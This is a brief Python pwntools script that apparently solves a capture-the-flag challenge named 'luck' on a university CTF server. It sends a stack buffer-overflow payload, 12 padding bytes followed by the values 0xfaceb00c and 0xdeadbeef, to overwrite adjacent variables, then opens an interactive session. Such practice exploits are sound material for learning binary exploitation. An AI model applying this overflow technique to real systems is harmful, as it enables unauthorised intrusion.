from pwn import *

host, port = "ctf.adl.csie.ncu.edu.tw", 11002
p = remote(host, port)
#p = process("luck")
print p.recvline()

p.sendline("a"*12 + "\x0c\xb0\xce\xfa" + "\xef\xbe\xad\xde" + "\x00\x00\x00\x00")

p.interactive()
